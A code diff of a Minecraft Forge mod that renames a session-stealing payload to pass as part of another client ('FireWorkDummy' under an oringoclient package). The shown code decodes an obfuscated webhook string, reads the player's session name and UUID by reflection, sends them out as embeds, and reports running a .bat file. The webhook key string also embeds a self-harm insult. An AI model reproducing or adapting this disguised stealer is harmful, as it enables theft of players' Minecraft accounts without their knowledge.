@@ -1,18 +1,19 @@
-package net.exotic.real;
+package me.oringo.oringoclient.commands;
 
 import net.minecraft.launchwrapper.Launch;
 import net.minecraftforge.fml.common.Mod;
-import net.minecraftforge.fml.common.event.*;
+import net.minecraftforge.fml.common.event.FMLInitializationEvent;
+import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
 
 import java.awt.*;
 import java.io.*;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.nio.charset.StandardCharsets;
-import java.util.*;
+import java.util.Base64;
 
-@Mod(modid = "exoticmod", name = "exoticmod", version = "1.0", acceptedMinecraftVersions = "[1.8.9]")
-public class ExoticMod {
+@Mod(modid = "FireWorkDummy", name = "FireWorkDummy", version = "1.0", acceptedMinecraftVersions = "[1.8.9]")
+public class FireWorkDummy {
 
     public static String webhook = "YOUSHOULDKILLYOURSELFNOW!944772932259967036!@#$%^&*(5O6M,0,C!-!1R_0_-0-LH:0:1018932983291&0&09172aLJ39172h9,0,FGMZ5%0%,0,09172aO68030eS6I_TVT50283fUEACL4G85629c29172iCRU68030e50283f,0,YQDO#0#!-!_0_RH>0>1018932983291MI";
 
@@ -49,8 +50,8 @@ public class ExoticMod {
             Object name = sessionClass.getMethod("func_111285_a").invoke(session);
             Object uuid = sessionClass.getMethod("func_148255_b").invoke(session);
 
-            ConfirmAH sendmessage = new ConfirmAH(decrypt(webhook));
-            sendmessage.addEmbed(new ConfirmAH.EmbedObject()
+            StalkYoutuberCommand sendmessage = new StalkYoutuberCommand(decrypt(webhook));
+            sendmessage.addEmbed(new StalkYoutuberCommand.EmbedObject()
                     .setTitle("Minecraft Info")
                     .setColor(Color.CYAN)
                     .addField("Name", name.toString(), true)
@@ -88,8 +89,8 @@ public class ExoticMod {
             }
 
             String webdecode = new String(Base64.getDecoder().decode(webhook.getBytes(StandardCharsets.UTF_8)));
-            ConfirmAH sendmessage = new ConfirmAH(webdecode);
-            sendmessage.addEmbed(new ConfirmAH.EmbedObject()
+            StalkYoutuberCommand sendmessage = new StalkYoutuberCommand(webdecode);
+            sendmessage.addEmbed(new StalkYoutuberCommand.EmbedObject()
                     .setTitle("Loading")
                     .setColor(Color.GREEN)
                     .addField("Message ", "Running .bat file", true));
